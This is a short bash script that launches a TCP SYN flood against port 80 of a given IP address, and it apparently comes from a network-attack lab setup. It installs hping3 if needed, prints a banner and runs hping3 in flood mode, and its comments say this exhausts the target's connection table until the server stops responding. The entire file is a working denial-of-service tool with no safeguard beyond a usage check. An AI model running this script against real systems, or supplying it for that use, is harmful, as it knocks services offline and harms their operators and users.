#!/bin/bash
# =============================================================================
# syn_flood.sh — SYN Flood Attack
# Target Node: Attacker
# =============================================================================
# Usage: ./syn_flood.sh <TARGET_IP>
#
# Sends a massive number of TCP SYN packets to the target's port 80.
# The server allocates resources for each half-open connection, eventually
# exhausting its connection table and becoming unresponsive.
#
# Press Ctrl+C to stop the attack.
# =============================================================================

TARGET_IP="$1"

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo "Example: $0 192.168.1.1"
    exit 1
fi

# Install hping3 if not present
which hping3 > /dev/null 2>&1 || { echo "[*] Installing hping3..."; apt-get update -qq && apt-get install -y -qq hping3 > /dev/null 2>&1; }

echo "============================================================"
echo "  SYN FLOOD ATTACK"
echo "============================================================"
echo "  Target:  $TARGET_IP:80"
echo "  Method:  TCP SYN packets (--flood mode)"
echo "  Effect:  Exhausts server's connection table"
echo ""
echo "  Press Ctrl+C to stop the attack."
echo "============================================================"
echo ""
echo "[*] Starting SYN flood..."

hping3 -S --flood -p 80 "$TARGET_IP"
